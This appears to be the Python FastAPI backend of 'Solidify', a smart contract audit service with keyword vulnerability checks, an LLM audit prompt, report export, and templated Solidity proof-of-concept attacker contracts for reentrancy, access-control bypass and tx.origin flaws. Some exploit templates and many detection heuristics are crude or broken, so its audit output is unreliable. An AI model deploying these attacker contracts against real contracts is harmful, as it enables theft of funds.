import asyncio
import uuid
import os
import re
import json
import logging
from typing import Optional, Dict, Any, List

import aiohttp
from dotenv import load_dotenv
from fastapi import FastAPI, HTTPException, Body
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import StreamingResponse, PlainTextResponse
from pydantic import BaseModel

load_dotenv()

DEFAULT_MODEL = os.getenv("SOLIDIFY_MODEL", "minimaxai/minimax-m2.5")
DEFAULT_PROVIDER = os.getenv("SOLIDIFY_PROVIDER", "nvidia")
NVIDIA_API_KEY = os.getenv("NVIDIA_API_KEY", "")
NVIDIA_BASE_URL = os.getenv("NVIDIA_BASE_URL", "https://integrate.api.nvidia.com")
OPENAI_API_KEY = os.getenv("OPENAI_API_KEY", "")
ANTHROPIC_API_KEY = os.getenv("ANTHROPIC_API_KEY", "")

logging.basicConfig(level=logging.INFO, format="%(message)s")
logger = logging.getLogger(__name__)

app = FastAPI(title="Solidify API", version="1.0.0")

cors_origins = os.getenv("CORS_ORIGINS", "http://localhost:5173,http://localhost:3000").split(",")
app.add_middleware(
    CORSMiddleware,
    allow_origins=cors_origins,
    allow_methods=["*"],
    allow_headers=["*"],
)

audit_tasks: Dict[str, Dict[str, Any]] = {}

CHAINS = {
    "ethereum": {"id": "ethereum", "name": "Ethereum", "chain_id": 1, "explorer": "etherscan.io", "api": "api.etherscan.io"},
    "bsc": {"id": "bsc", "name": "BNB Chain", "chain_id": 56, "explorer": "bscscan.com", "api": "api.bscscan.com"},
    "polygon": {"id": "polygon", "name": "Polygon", "chain_id": 137, "explorer": "polygonscan.com", "api": "api.polygonscan.com"},
    "arbitrum": {"id": "arbitrum", "name": "Arbitrum", "chain_id": 42161, "explorer": "arbiscan.io", "api": "api.arbiscan.io"},
    "optimism": {"id": "optimism", "name": "Optimism", "chain_id": 10, "explorer": "optimistic.etherscan.io", "api": "api-optimistic.etherscan.io"},
}

ETHERSCAN_API_KEY = os.getenv("ETHERSCAN_API_KEY", "YourApiKeyToken")


class AuditRequest(BaseModel):
    code: Optional[str] = None
    address: Optional[str] = None
    chain: str = "ethereum"
    provider: Optional[str] = None
    model: Optional[str] = None
    command: str = "audit"

class ChatRequest(BaseModel):
    message: str
    provider: Optional[str] = None
    model: Optional[str] = None
    history: Optional[List[Dict[str, str]]] = []


async def fetch_contract_source(address: str, chain: str) -> Optional[str]:
    chain_config = CHAINS.get(chain, CHAINS["ethereum"])
    api_url = f"https://{chain_config['api']}/api"
    params = {"module": "contract", "action": "getsourcecode", "address": address, "apikey": ETHERSCAN_API_KEY}
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, params=params) as response:
                if response.status == 200:
                    data = await response.json()
                    if data.get("status") == "1" and data.get("result"):
                        source = data["result"][0].get("SourceCode", "")
                        if source:
                            return source
    except Exception as e:
        logger.error(f"Etherscan fetch error: {e}")
    return None


VULNERABILITY_PATTERNS = [
    {
        "id": "REENTRANCY", "name": "Reentrancy Vulnerability", "severity": "CRITICAL", "cvss": 9.1,
        "check": lambda c: (
            "call" in c and ("value" in c or ".send(" in c)
            and "ReentrancyGuard" not in c and "checks-effects" not in c.lower()
        ),
        "desc": "External call without reentrancy guard",
        "fix": "Use ReentrancyGuard modifier or checks-effects-interactions pattern",
    },
    {
        "id": "ACCESS_CONTROL", "name": "Missing Access Control", "severity": "CRITICAL", "cvss": 9.0,
        "check": lambda c: (
            ("withdraw" in c or "transfer" in c or "mint" in c or "burn" in c)
            and "only" not in c.lower() and "require(msg.sender" not in c
        ),
        "desc": "Critical function without access control",
        "fix": "Add require(msg.sender == owner) or use OpenZeppelin Ownable",
    },
    {
        "id": "INTEGER_OVERFLOW", "name": "Integer Overflow/Underflow", "severity": "HIGH", "cvss": 7.8,
        "check": lambda c: (
            ("+" in c or "-" in c or "*" in c) and "unchecked" not in c.lower()
            and "^0.7" in c and "SafeMath" not in c
        ),
        "desc": "Arithmetic without SafeMath",
        "fix": "Use OpenZeppelin SafeMath or solc ^0.8.0",
    },
    {
        "id": "TX_ORIGIN", "name": "tx.origin Vulnerability", "severity": "MEDIUM", "cvss": 5.3,
        "check": lambda c: "tx.origin" in c,
        "desc": "Using tx.origin for authorization",
        "fix": "Use msg.sender instead of tx.origin",
    },
    {
        "id": "UNCHECKED_CALL", "name": "Unchecked External Call", "severity": "HIGH", "cvss": 7.5,
        "check": lambda c: ".call(" in c and "require(" not in c and "if not" not in c.lower() and "if(" not in c,
        "desc": "External call return value not checked",
        "fix": "Check return value or use SafeERC20",
    },
    {
        "id": "TIMESTAMP_DEP", "name": "Timestamp Dependence", "severity": "MEDIUM", "cvss": 4.8,
        "check": lambda c: ("now" in c or "block.timestamp" in c) and ("lottery" in c or "draw" in c or "random" in c or "winner" in c),
        "desc": "Using timestamp for critical logic",
        "fix": "Use block number or Chainlink oracle",
    },
    {
        "id": "CONSTANT_PRAGMA", "name": "Floating Pragma", "severity": "LOW", "cvss": 2.1,
        "check": lambda c: "^" in c and "pragma" in c,
        "desc": "Floating pragma version",
        "fix": "Lock pragma version e.g. 0.8.19",
    },
    {
        "id": "MISSING_ZERO_CHECK", "name": "Missing Zero Address Check", "severity": "MEDIUM", "cvss": 5.5,
        "check": lambda c: "constructor" in c and "require" not in c.lower() and "address(0)" in c,
        "desc": "No zero address validation in constructor",
        "fix": "Add require(addr != address(0))",
    },
    {
        "id": "UNVERIFIED_INTERFACE", "name": "Missing Interface Verification", "severity": "LOW", "cvss": 3.2,
        "check": lambda c: "interface" in c and "is" not in c,
        "desc": "Incomplete interface declaration",
        "fix": "Properly inherit or use Contract ABI",
    },
    {
        "id": "GAS_LIMIT_LOOP", "name": "Unbounded Loop", "severity": "MEDIUM", "cvss": 4.8,
        "check": lambda c: "for" in c and "length" in c and "i++" in c and "gasleft()" not in c.lower(),
        "desc": "Unbounded loop could hit gas limit",
        "fix": "Check gasleft() or limit iterations",
    },
]


def parse_solidity(code: str) -> Dict[str, Any]:
    vulns = []
    lines = code.split("\n")
    code_lower = code.lower()

    for vuln in VULNERABILITY_PATTERNS:
        try:
            matches = []
            for i, line in enumerate(lines, 1):
                if vuln["check"](line):
                    matches.append(f"Line {i}")
            if matches:
                location = ", ".join(matches[:3])
                if len(matches) > 3:
                    location += f" (+{len(matches) - 3} more)"
                vulns.append({
                    "type": vuln["name"], "severity": vuln["severity"],
                    "location": location, "description": vuln["desc"],
                    "recommendation": vuln["fix"], "cvss": vuln["cvss"], "vuln_id": vuln["id"],
                })
        except Exception:
            continue

    if re.search(r"selfdestruct\(|suicide\(", code):
        vulns.append({"type": "Deprecated Selfdestruct", "severity": "CRITICAL", "location": "selfdestruct/suicide",
                       "description": "Using deprecated selfdestruct", "recommendation": "Use custom withdraw pattern",
                       "cvss": 9.0, "vuln_id": "SELFDESTRUCT"})
    if re.search(r"\.delegatecall\(", code):
        vulns.append({"type": "Unsafe Delegatecall", "severity": "HIGH", "location": "delegatecall",
                       "description": "Delegatecall can execute malicious logic",
                       "recommendation": "Audit delegatecall target carefully", "cvss": 8.0, "vuln_id": "DELEGATECALL"})
    if "block.blockhash" in code and "random" in code_lower:
        vulns.append({"type": "Weak Randomness", "severity": "HIGH", "location": "block.blockhash",
                       "description": "Block hash is predictable for miners", "recommendation": "Use Chainlink VRF",
                       "cvss": 8.5, "vuln_id": "WEAK_RANDOM"})

    severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
    vulns.sort(key=lambda x: severity_order.get(x["severity"], 4))

    score = 10.0
    for v in vulns:
        if v["severity"] == "CRITICAL": score -= 3.0
        elif v["severity"] == "HIGH": score -= 2.0
        elif v["severity"] == "MEDIUM": score -= 1.0
        elif v["severity"] == "LOW": score -= 0.5
    score = max(0, round(score, 1))

    summary = f"Found {len(vulns)} vulnerabilities. "
    if vulns:
        critical = sum(1 for v in vulns if v["severity"] == "CRITICAL")
        high = sum(1 for v in vulns if v["severity"] == "HIGH")
        if critical > 0: summary += f"{critical} CRITICAL, "
        if high > 0: summary += f"{high} HIGH, "
        summary = summary.rstrip(", ") + " require immediate attention."

    return {
        "score": score,
        "vulnerabilities": vulns,
        "summary": summary,
        "stats": {
            "critical": sum(1 for v in vulns if v["severity"] == "CRITICAL"),
            "high": sum(1 for v in vulns if v["severity"] == "HIGH"),
            "medium": sum(1 for v in vulns if v["severity"] == "MEDIUM"),
            "low": sum(1 for v in vulns if v["severity"] == "LOW"),
        },
    }


@app.get("/api/chains")
async def get_chains():
    return list(CHAINS.values())


@app.post("/api/chat")
async def chat(request: ChatRequest):
    try:
        from providers.provider_factory import create_provider

        provider_name = request.provider or DEFAULT_PROVIDER
        model_name = request.model or DEFAULT_MODEL

        history_text = ""
        for msg in request.history[-5:]:
            history_text += f"{msg.get('role', 'user')}: {msg.get('content', '')}\n"

        prompt = f"""You are Solidify, a smart contract security expert. Answer the user's question helpfully and technically.

{history_text}
user: {request.message}

expert:"""

        provider = create_provider(provider_name, model_name)
        if not provider:
            return {"message": "AI provider not available. Check your API key configuration.", "role": "assistant"}

        response = await provider.generate(prompt)
        content = response.content if hasattr(response, "content") else str(response)
        return {"message": content, "role": "assistant"}

    except Exception as e:
        logger.error(f"Chat error: {e}")
        return {"message": "Sorry, I encountered an error. Please try again.", "error": str(e)}


@app.post("/api/audit/start")
async def start_audit(request: AuditRequest):
    task_id = str(uuid.uuid4())[:8]

    code = request.code
    if request.address:
        code = await fetch_contract_source(request.address, request.chain)
        if not code:
            raise HTTPException(status_code=404, detail="Contract not found or not verified on explorer")

    if not code:
        raise HTTPException(status_code=400, detail="Code or address required")

    audit_tasks[task_id] = {
        "task_id": task_id,
        "code": code,
        "chain": request.chain,
        "provider": request.provider or DEFAULT_PROVIDER,
        "model": request.model or DEFAULT_MODEL,
        "status": "queued",
        "progress": 0,
        "result": None,
        "events": [],
    }

    asyncio.create_task(_process_audit(task_id))
    return {"task_id": task_id, "status": "started"}


async def _process_audit(task_id: str):
    task = audit_tasks[task_id]
    code = task["code"]
    result = parse_solidity(code)

    try:
        _push_event(task, "queued", 5)
        await asyncio.sleep(0.3)

        from providers.provider_factory import create_provider

        _push_event(task, "connecting", 10)
        await asyncio.sleep(0.2)

        provider_instance = None
        try:
            provider_instance = create_provider(task["provider"], task["model"])
        except Exception:
            pass

        if provider_instance:
            _push_event(task, "analyzing", 30)

            prompt = f"""You are Solidify. Analyze this {task['chain']} Solidity code:

```{code}```

Check: reentrancy, access control, overflow, unchecked calls, tx.origin, flash loans, oracles, front-running.

Return ONLY valid JSON:
{{"score": 0-10, "vulnerabilities": [{{"type": "", "severity": "", "location": "", "description": "", "recommendation": "", "cvss": 0}}], "summary": ""}}"""

            full_response = ""
            async for chunk in provider_instance.generate_stream(prompt):
                chunk_str = chunk if isinstance(chunk, str) else chunk.decode()
                full_response += chunk_str
                _push_chunk(task, chunk_str)

            try:
                start = full_response.find("{")
                end = full_response.rfind("}") + 1
                if start >= 0:
                    result = json.loads(full_response[start:end])
                else:
                    result = parse_solidity(code)
            except (json.JSONDecodeError, ValueError):
                result = parse_solidity(code)
        else:
            _push_event(task, "scanning", 50)
            await asyncio.sleep(1)
            result = parse_solidity(code)

        _complete_task(task, result)

    except Exception as e:
        logger.error(f"Audit processing error: {e}")
        result = parse_solidity(code)
        _complete_task(task, result)


def _push_event(task: dict, status: str, progress: int):
    task["status"] = status
    task["progress"] = progress
    task["events"].append({"status": status, "progress": progress})


def _push_chunk(task: dict, chunk: str):
    task["status"] = "streaming"
    task["events"].append({"status": "streaming", "chunk": chunk})


def _complete_task(task: dict, result: dict):
    task["status"] = "completed"
    task["progress"] = 100
    task["result"] = result
    task["events"].append({"status": "completed", "progress": 100, "result": result})


@app.get("/api/audit/stream/{task_id}")
async def stream_audit(task_id: str):
    if task_id not in audit_tasks:
        raise HTTPException(status_code=404, detail="Task not found")

    async def event_generator():
        task = audit_tasks[task_id]
        seen = 0
        while True:
            while seen < len(task["events"]):
                event = task["events"][seen]
                seen += 1
                yield f"data: {json.dumps(event)}\n\n"
                if event.get("status") == "completed":
                    return
            await asyncio.sleep(0.2)

    return StreamingResponse(event_generator(), media_type="text/event-stream")


@app.get("/api/audit/status/{task_id}")
async def get_status(task_id: str):
    if task_id not in audit_tasks:
        raise HTTPException(status_code=404, detail="Task not found")
    task = audit_tasks[task_id]
    return {"task_id": task_id, "status": task["status"], "progress": task.get("progress", 0)}


@app.get("/api/audit/report/{task_id}")
async def get_report(task_id: str):
    if task_id not in audit_tasks:
        raise HTTPException(status_code=404, detail="Task not found")
    task = audit_tasks[task_id]
    if task["status"] != "completed":
        return {"status": task["status"], "progress": task.get("progress", 0)}
    return task.get("result", {})


def generate_markdown_report(result: dict) -> str:
    md = f"""# Solidify Security Audit Report

## Summary
- **Security Score**: {result.get("score", "N/A")}/10
- **Vulnerabilities Found**: {len(result.get("vulnerabilities", []))}

{result.get("summary", "")}

---

## Vulnerabilities

"""
    for v in result.get("vulnerabilities", []):
        md += f"""### [{v.get("severity", "INFO")}] {v.get("type", "Unknown")}
- **Location**: `{v.get("location", "N/A")}`
- **CVSS**: {v.get("cvss", "N/A")}
- **Description**: {v.get("description", "")}
"""
        if v.get("recommendation"):
            md += f"""- **Recommendation**: {v.get("recommendation")}
"""
        if v.get("patch"):
            md += f"""**Secure Patch:**
```solidity
{v.get("patch")}
```
"""
    return md


def generate_poc_exploit(vuln: dict, target_contract: str) -> str:
    vuln_type = vuln.get("type", "").lower()
    vuln_name = vuln.get("type", "Unknown")

    if "reentrancy" in vuln_type:
        return """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ReentrancyAttacker {
    address public victim;
    
    constructor(address _victim) {
        victim = _victim;
    }
    
    function attack() external payable {
        (bool ok, ) = victim.call{value: msg.value}("withdraw");
        require(ok, "call failed");
    }
    
    receive() external payable {
        if (victim.balance >= 1 ether) {
            (bool ok, ) = victim.call{value: 0}("withdraw");
        }
    }
}"""
    elif "access control" in vuln_type:
        return """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AccessControlBypass {
    function exploit(address target) external {
        (bool ok, ) = target.call(abi.encodeWithSignature("withdraw()"));
        require(ok, "Access bypassed - vulnerable if succeeds");
    }
}"""
    elif "overflow" in vuln_type:
        return """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract OverflowExploit {
    function exploit() external pure returns (uint256) {
        uint256 amount = type(uint256).max;
        unchecked {
            return amount + 1;
        }
    }
}"""
    elif "tx.origin" in vuln_type:
        return """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TxOriginExploit {
    address public attacker;
    constructor(address _attacker) { attacker = _attacker; }
    function exploit(address target) external {
        (bool ok, ) = target.call{value: 0}("withdrawTo(address)", attacker);
    }
}"""
    return f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract GenericExploit {{
    string public vulnType = "{vuln_name}";
}}"""


def generate_test_case(code: str, vuln: dict) -> str:
    vuln_type = vuln.get("type", "Test")
    vuln_id = vuln.get("type", "vulnerability").replace(" ", "_").lower()
    return f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";
import "./TargetContract.sol";
contract {vuln_type.replace(" ", "")}Test is Test {{
    function test_{vuln_id}() public {{
        vm.expectRevert();
    }}
}}"""


@app.get("/api/export/markdown/{task_id}")
async def export_markdown(task_id: str):
    if task_id not in audit_tasks:
        raise HTTPException(status_code=404, detail="Task not found")
    task = audit_tasks[task_id]
    if task.get("status") != "completed":
        return {"error": "Audit not completed"}
    return PlainTextResponse(content=generate_markdown_report(task.get("result", {})), media_type="text/markdown")


@app.get("/api/export/pdf/{task_id}")
async def export_pdf(task_id: str):
    if task_id not in audit_tasks:
        raise HTTPException(status_code=404, detail="Task not found")
    task = audit_tasks[task_id]
    if task.get("status") != "completed":
        return {"error": "Audit not completed"}

    result = task.get("result", {})
    vulns = result.get("vulnerabilities", [])
    pdf_content = f"""Solidify Security Audit Report
{'=' * 40}
Score: {result.get('score', 'N/A')}/10
Vulnerabilities: {len(vulns)}

Summary:
{result.get('summary', '')}

Vulnerability Details:
"""
    for v in vulns:
        pdf_content += f"""
[{v.get('severity', 'INFO')}] {v.get('type', 'Unknown')}
  Location: {v.get('location', 'N/A')}
  CVSS: {v.get('cvss', 'N/A')}
  Description: {v.get('description', '')}
  Fix: {v.get('recommendation', 'N/A')}
"""
    return PlainTextResponse(content=pdf_content, media_type="text/plain; charset=utf-8",
                              headers={"Content-Disposition": f"attachment; filename=audit-{task_id}.txt"})


@app.get("/api/poc/{task_id}")
async def get_poc(task_id: str):
    if task_id not in audit_tasks:
        raise HTTPException(status_code=404, detail="Task not found")
    task = audit_tasks[task_id]
    if task.get("status") != "completed":
        return {"error": "Audit not completed"}
    result = task.get("result", {})
    target = task.get("input", "TargetContract")
    pocs = []
    for v in result.get("vulnerabilities", []):
        if v.get("severity") in ["CRITICAL", "HIGH"]:
            pocs.append({
                "vulnerability": v.get("type"), "severity": v.get("severity"),
                "exploit_code": generate_poc_exploit(v, target),
                "test_case": generate_test_case(target, v),
            })
    return {"pocs": pocs}


@app.post("/api/detect/gas")
async def detect_gas(code: str = Body(..., embed=True)):
    issues = []
    lines = code.split("\n")

    storage_reads = [i + 1 for i, line in enumerate(lines) if ".balance" in line and "storage" not in line]
    if len(storage_reads) > 1:
        issues.append({
            "type": "Multiple Storage Reads", "location": f"Lines {storage_reads[:3]}",
            "issue": f"Reading storage {len(storage_reads)} times - cache in memory",
            "recommendation": "Cache in local variable: uint256 bal = address(this).balance;",
            "savings": f"~{2100 * (len(storage_reads) - 1)} gas",
        })

    for i, line in enumerate(lines):
        if "for" in line and "length" in line and "i++" in line:
            issues.append({
                "type": "Unbounded Loop", "location": f"Line {i + 1}",
                "issue": "Dynamic loop without gas check", "recommendation": "Check gasleft() inside loop",
                "savings": "Prevents out-of-gas revert",
            })

    if code.count(".balance") > 2:
        issues.append({
            "type": "Repeated SLOAD", "location": ".balance access",
            "issue": "Multiple storage reads for same variable", "recommendation": "Use local variable",
            "savings": "~2100 gas each",
        })

    return {"optimizations": issues}


@app.post("/api/detect/frontrun")
async def detect_frontrun(code: str = Body(..., embed=True)):
    issues = []
    code_lower = code.lower()

    if ("swap" in code_lower or "exchange" in code_lower) and "minAmount" not in code_lower and "slippage" not in code_lower:
        issues.append({
            "type": "No Slippage Protection", "location": "swap function",
            "issue": "Swap can be sandwiched for profit",
            "recommendation": "Add minimum token amount out: require(amountOut >= minOut)", "severity": "HIGH",
        })

    if "uint256(-1)" in code or "type(uint256).max" in code:
        issues.append({
            "type": "Unlimited Token Approval", "location": "approve function",
            "issue": "Infinite approval allows any address to drain tokens",
            "recommendation": "Set specific allowance: approve(token, amount)", "severity": "MEDIUM",
        })

    if code_lower.count("onlyowner") == 0 and "msg.sender == owner" not in code_lower:
        if "withdraw" in code_lower or "transfer" in code_lower:
            issues.append({
                "type": "Missing Access Control", "location": "withdraw/transfer",
                "issue": "No owner modifier on critical function", "recommendation": "Add onlyOwner modifier",
                "severity": "HIGH",
            })

    return {"vulnerabilities": issues}


@app.post("/api/detect/oracle")
async def detect_oracle(code: str = Body(..., embed=True)):
    issues = []
    for pattern, desc in [
        ("block.timestamp", "Block timestamp can be manipulated by miner"),
        ("block.blockhash", "Block hash is not unpredictable"),
        ("now", "now() is deprecated and manipulable"),
    ]:
        if pattern in code:
            issues.append({
                "type": "On-Chain Price Oracle", "location": pattern, "issue": desc,
                "recommendation": "Use Chainlink price feed for production",
                "severity": "HIGH" if "price" in desc else "MEDIUM",
            })

    if "blockhash" in code and "random" in code.lower():
        issues.append({
            "type": "Predictable Randomness", "location": "blockhash usage",
            "issue": "Miner can predict and manipulate randomness",
            "recommendation": "Use Chainlink VRF for verifiable randomness", "severity": "CRITICAL",
        })

    return {"vulnerabilities": issues}


if __name__ == "__main__":
    import uvicorn
    logger.info("Starting Solidify API server on http://localhost:8000")
    uvicorn.run(app, host="0.0.0.0", port=8000)
